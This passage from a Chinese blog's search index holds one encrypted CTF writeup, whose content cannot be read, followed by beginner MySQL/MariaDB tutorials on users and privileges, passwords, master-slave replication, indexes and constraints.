1d07740c5ac54a3e7cb01f5ab8454a7854a9fbb68efb3f0135ef23f6a7391acf7fd01205862b3741971b54796b0e2a6ed1aeac89680d7bdf093f5f961948e901933ab9061271add3ef14667a94b0cf12ab4b6c27ede8f60c53f84f93058f2ec9ddaa6f0e47962fb82c049ede24e71f7ce03d75ee9fdab2d595bc7a12a716715a8ac8d8badc7b00a67e0b56f301c3bb5ef98dc81b19a56f5fa53914deb49f0fa3cb13644f2d1e3d503ade5ebf24da2ad705a63fd2b449a4b396102644a50a71d6a6aae057399566f15206ea6d6fdcd5067642812787abe775862ff0cfe8dde3da12dc09bd360a2989626db716e64e3aec99d1450e95d14435cc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>ctfshow-web入门</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
        <tag>web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（二）</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%8C%EF%BC%89.html</url>
    <content><![CDATA[<h1 id="用户操作"><a href="#用户操作" class="headerlink" title="用户操作"></a>用户操作</h1><h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;username&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;password&#x27;</span>;<br></code></pre></td></tr></table></figure>
<blockquote>
<p>username - 你将创建的用户名,<br>host - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%.<br>password - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器.</p>
</blockquote>
<p>例子：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;192.168.1.101&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;username&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure>
<p>可以在系统表<code>user</code>中看到所用用户信息<br>因为字段太多，所以只查看<code>user</code>，<code>host</code>，<code>password</code>字段</p>
<h2 id="赋予用户权限"><a href="#赋予用户权限" class="headerlink" title="赋予用户权限"></a>赋予用户权限</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> DATABASENAME.TABLENAME <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;username&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span>;<br></code></pre></td></tr></table></figure>
<blockquote>
<p>privileges - 用户的操作权限,如SELECT , INSERT , UPDATE 等.如果要授予所的权限则使用ALL.;<br>databasename - 数据库名,<br>tablename-表名,如果要授予该用户对所有数据库和表的相应操作权限则可用 * 表示, 如 <em>.</em></p>
</blockquote>
<p>例子：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> test.<span class="hljs-keyword">user</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>; 刷新权限<br></code></pre></td></tr></table></figure>

<p>注意:用以上命令授权的用户不能给其它用户授权,如果想让该用户可以授权,用以下命令:<br>GRANT privileges ON databasename.tablename TO ‘username‘@’host’ with grant option;</p>
<h2 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限"></a>查看用户权限</h2><figure class="highlight dart"><table><tr><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;user01&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="回收用户权限"><a href="#回收用户权限" class="headerlink" title="回收用户权限"></a>回收用户权限</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">REVOKE</span> <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">ON</span> *.*  <span class="hljs-keyword">FROM</span> 用户名@’%’;             <span class="hljs-comment">-- 回收部分权限</span><br><span class="hljs-keyword">REVOKE</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">FROM</span> 用户名@’%’;             <span class="hljs-comment">-- 回收所有权限</span><br></code></pre></td></tr></table></figure>


<h1 id="密码操作"><a href="#密码操作" class="headerlink" title="密码操作"></a>密码操作</h1><h2 id="数据库内修改用户密码"><a href="#数据库内修改用户密码" class="headerlink" title="数据库内修改用户密码"></a>数据库内修改用户密码</h2><h3 id="root修改其他用户密码"><a href="#root修改其他用户密码" class="headerlink" title="root修改其他用户密码"></a>root修改其他用户密码</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;user01&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>=<span class="hljs-keyword">password</span>(<span class="hljs-string">&#x27;Qwer1234&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h3 id="普通用户修改自己密码"><a href="#普通用户修改自己密码" class="headerlink" title="普通用户修改自己密码"></a>普通用户修改自己密码</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-keyword">password</span>(<span class="hljs-string">&#x27;123456&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="数据库外修改密码"><a href="#数据库外修改密码" class="headerlink" title="数据库外修改密码"></a>数据库外修改密码</h2><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">mysqladmin -u root -<span class="hljs-selector-tag">p</span>原密码 password 修改的密码<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（六）</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%EF%BC%88%E5%85%AD%EF%BC%89.html</url>
    <content><![CDATA[<h1 id="主从备份"><a href="#主从备份" class="headerlink" title="主从备份"></a>主从备份</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>主数据库：10.10.10.1   db1<br>从数据库：10.10.10.2   db2</p>
<p>mariadb版本越高越好</p>
<p>关闭firewalld和selinux或者开启对应规则</p>
<h2 id="更改密码和设置权限"><a href="#更改密码和设置权限" class="headerlink" title="更改密码和设置权限"></a>更改密码和设置权限</h2><p><code>mysql_secure_installation</code></p>
<p>disallow root login remotely需要选n，其他y<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-1.jpg"></p>
<h2 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h2><p><code>vim /etc/my.cnf.d/server.cnf</code></p>
<p>在mysqld下写入如下设置</p>
<p>db1中</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><br><span class="hljs-attr">log_bin</span> = mysql-bin  //[必须]启用二进制日志<br><span class="hljs-attr">server_id</span> = <span class="hljs-number">1</span>        //[必须]服务器唯一ID，默认是<span class="hljs-number">1</span>，一般取IP最后一段<br></code></pre></td></tr></table></figure>

<p>db2中</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><br><span class="hljs-attr">log_bin</span> = mysql-bin<br><span class="hljs-attr">server_id</span> = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<h2 id="在db1上授权"><a href="#在db1上授权" class="headerlink" title="在db1上授权"></a>在db1上授权</h2><p><code>grant replication slave on *.* to &#39;user&#39;@&#39;192.168.1.2&#39; identified by &quot;123456&quot;;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-2.jpg"></p>
<h2 id="在db2上匹配用户信息并启用进程"><a href="#在db2上匹配用户信息并启用进程" class="headerlink" title="在db2上匹配用户信息并启用进程"></a>在db2上匹配用户信息并启用进程</h2><p><code>change master to master_host=&quot;192.168.1.1&quot;,master_user=&quot;user&quot;,master_password=&quot;123456&quot;;</code></p>
<p><code>start slave</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-3.jpg"></p>
<h2 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h2><p><code>show  slave  status\G;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-4.jpg"></p>
<p>注：slave_io_running及slave_sql_running进程必须正常运行，即YES状态，否则都是错误的状态。</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（五）</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%94%EF%BC%89.html</url>
    <content><![CDATA[<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><blockquote>
<p>索引是一种特殊的数据库结构，由数据表中的一列或多列组合而成，可以用来快速查询数据表中有某一特定值的记录。</p>
</blockquote>
<blockquote>
<p>使用索引可以很大程度上提高数据库的查询速度，还有效的提高了数据库系统的性能。</p>
</blockquote>
<h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><p>方法一：<br><code>create index &lt;索引名&gt; on &lt;表名&gt; (&lt;列名&gt; [&lt;长度&gt;] [ ASC | DESC])</code></p>
<p>1: 在一个已有的表上创建索引，但是这个语句不能创建主键<br>2: 一个表可以创建多个索引，但每个索引在该表中的名称是唯一的<br>3: 列名和长度是可选项<br>4: asc指定索引按照升序来排列，desc指定索引按照降序来排列，默认为ASC</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-1.png"></p>
<p>方法二：<br>创建表的时候同时创建索引</p>
<p>方法三：<br><code>alter table &lt;name&gt; add [UNIQUE | FULLTEXT] [INDEX] 索引名(列名)</code></p>
<p>与<code>create index</code>语句差不多<br><code>unique|fulltext</code>为可选参数，分别表示唯一索引、全文索引</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-2.png"></p>
<h2 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h2><p>方法一：<br><code>drop index &lt;索引名&gt; on &lt;表名&gt;</code></p>
<p>方法二：<br><code>alter table &lt;表名&gt; drop index &lt;索引名&gt;</code></p>
<h2 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h2><p><code>show index from &lt;表名&gt; [ from &lt;数据库名&gt;]</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-3.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-4.png"></p>
<h1 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-5.png"></p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-6.png"></p>
<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-7.png"></p>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql-5-8.png"></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（四）</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%EF%BC%88%E5%9B%9B%EF%BC%89.html</url>
    <content><![CDATA[<h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h1><h2 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h2><blockquote>
<p>主键（PRIMARY KEY）的完整称呼是“主键约束”，是 MySQL 中使用最为频繁的约束。一般情况下，为了便于 DBMS 更快的查找到表中的记录，都会在表中设置一个主键。</p>
</blockquote>
<p>主键分为单字段主键和多字段联合主键</p>
<p>关键参数<code>primary key</code></p>
<h3 id="单字段主键"><a href="#单字段主键" class="headerlink" title="单字段主键"></a>单字段主键</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql4-1.jpg"></p>
<h3 id="多字段主键"><a href="#多字段主键" class="headerlink" title="多字段主键"></a>多字段主键</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql4-2.jpg"></p>
<h2 id="自增长"><a href="#自增长" class="headerlink" title="自增长"></a>自增长</h2><blockquote>
<p>默认情况下，AUTO_INCREMENT 的初始值是 1，每新增一条记录，字段值自动加 1。<br>一个表中只能有一个字段使用 AUTO_INCREMENT 约束，且该字段必须有唯一索引，以避免序号重复（即为主键或主键的一部分）。<br>AUTO_INCREMENT 约束的字段必须具备 NOT NULL 属性。<br>AUTO_INCREMENT 约束的字段只能是整数类型（TINYINT、SMALLINT、INT、BIGINT 等）。<br>AUTO_INCREMENT 约束字段的最大值受该字段的数据类型约束，如果达到上限，AUTO_INCREMENT 就会失效。</p>
</blockquote>
<p>关键参数<code>auto_increment</code></p>
<h3 id="主键自增长"><a href="#主键自增长" class="headerlink" title="主键自增长"></a>主键自增长</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql4-3.jpg"></p>
<h3 id="指定开始的值"><a href="#指定开始的值" class="headerlink" title="指定开始的值"></a>指定开始的值</h3><p>例如从100开始自增<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql4-4.jpg"></p>
<h2 id="唯一约束"><a href="#唯一约束" class="headerlink" title="唯一约束"></a>唯一约束</h2><blockquote>
<p>MySQL 唯一约束（Unique Key）是指所有记录中字段的值不能重复出现。例如，为 id 字段加上唯一性约束后，每条记录的 id 值都是唯一的，不能出现重复的情况。如果其中一条记录的 id 值为‘0001’，那么该表中就不能出现另一条记录的 id 值也为‘0001’。</p>
</blockquote>
<blockquote>
<p>唯一约束与主键约束相似的是它们都可以确保列的唯一性。不同的是，唯一约束在一个表中可有多个，并且设置唯一约束的列允许有空值，但是只能有一个空值。而主键约束在一个表中只能有一个，且不允许有空值。比如，在用户信息表中，为了避免表中用户名重名，可以把用户名设置为唯一约束。</p>
</blockquote>
<p>关键参数<code>unique</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql4-5.jpg"></p>
<h2 id="非空约束"><a href="#非空约束" class="headerlink" title="非空约束"></a>非空约束</h2><blockquote>
<p>MySQL 非空约束（NOT NULL）指字段的值不能为空。对于使用了非空约束的字段，如果用户在添加数据时没有指定值，数据库系统就会报错。可以通过 CREATE TABLE 或 ALTER TABLE 语句实现。在表中某个列的定义后加上关键字 NOT NULL 作为限定词，来约束该列的取值不能为空。</p>
</blockquote>
<blockquote>
<p>比如，在用户信息表中，如果不添加用户名，那么这条用户信息就是无效的，这时就可以为用户名字段设置非空约束。</p>
</blockquote>
<p>关键参数<code>not null</code></p>
<p>除了email，其他不允许有空值<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql4-6.jpg"></p>
<h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><blockquote>
<p>默认值（Default）的完整称呼是“默认值约束（Default Constraint）”，用来指定某列的默认值。在表中插入一条新记录时，如果没有为某个字段赋值，系统就会自动为这个字段插入默认值。</p>
</blockquote>
<p>关键参数<code>default</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql4-7.jpg"></p>
<h2 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h2><blockquote>
<p>MySQL 外键约束（FOREIGN KEY）是表的一个特殊字段，经常与主键约束一起使用。对于两个具有关联关系的表而言，相关联字段中主键所在的表就是主表（父表），外键所在的表就是从表（子表）。</p>
</blockquote>
<p>关键参数<code>foreign key() references table()</code></p>
<p>表1：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; desc table1;<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field </span>|<span class="hljs-string"> Type        </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> id    </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> NO   </span>|<span class="hljs-string"> PRI </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> name  </span>|<span class="hljs-string"> varchar(15) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> age   </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+-------+-------------+------+-----+---------+-------+<br>3 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>表二：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; create table table2(id int primary key,age int,name varchar(12),foreign key(age) references table1(id));<br>Query OK, 0 rows affected (0.00 sec)<br><br>MariaDB [test]&gt; desc table2;<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field </span>|<span class="hljs-string"> Type        </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> id    </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> NO   </span>|<span class="hljs-string"> PRI </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> age   </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string"> MUL </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> name  </span>|<span class="hljs-string"> varchar(12) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+-------+-------------+------+-----+---------+-------+<br>3 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>注意：从表的外键关联的必须是主表的主键，且主键和外键的数据类型必须一致。例如，两者都是 INT 类型，或者都是 CHAR 类型。如果不满足这样的要求，在创建从表时，就会出现“ERROR 1005(HY000): Can’t create table”错误。</p>
</blockquote>
<h2 id="检查约束"><a href="#检查约束" class="headerlink" title="检查约束"></a>检查约束</h2><blockquote>
<p>MySQL 检查约束（CHECK）是用来检查数据表中字段值有效性的一种手段，可以通过 CREATE TABLE 或 ALTER TABLE 语句实现。设置检查约束时要根据实际情况进行设置，这样能够减少无效数据的输入。</p>
</blockquote>
<blockquote>
<p>默认值约束和非空约束也可看作是特殊的检查约束。</p>
</blockquote>
<p>关键参数<code>check</code></p>
<p>但是设置了检查约束后并不会生效</p>
<ul>
<li>check不生效是为mysql的bug *<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">官网原文:<br><span class="hljs-keyword">CHECK</span><br>The <span class="hljs-keyword">CHECK</span> clause <span class="hljs-keyword">is</span> parsed but ignored <span class="hljs-keyword">by</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">storage</span> engines. See Section <span class="hljs-number">1.8</span><span class="hljs-number">.2</span><span class="hljs-number">.3</span>, “<span class="hljs-keyword">Foreign Key</span> Differences”.<br></code></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>解决方法：</p>
</blockquote>
<blockquote>
<p>1：如果要设置CHECK约束的字段范围小，并且比较容易列举全部的值，就可以考虑将该字段的类型设置为枚举类型 enum()或集合类型set()。</p>
</blockquote>
<blockquote>
<p>2:如果需要设置CHECK约束的字段范围大，且列举全部值比较困难，比如整数或者某一区间，那就只能使用触发器来代替约束实现数据的有效性了</p>
</blockquote>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql常见错误解决方案合集</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E5%90%88%E9%9B%86.html</url>
    <content><![CDATA[<h1 id="普通用户无法登录mysql"><a href="#普通用户无法登录mysql" class="headerlink" title="普通用户无法登录mysql"></a>普通用户无法登录mysql</h1><p>错误描述：</p>
<blockquote>
<p>ERROR 1045 (28000): Access denied for user ‘user01‘@’localhost’ (using password: YES)</p>
</blockquote>
<p>解决方案：<br>在<code>mysql.user</code>中存在空用户名账户，删除即可</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>报错</tag>
      </tags>
  </entry>
</search>
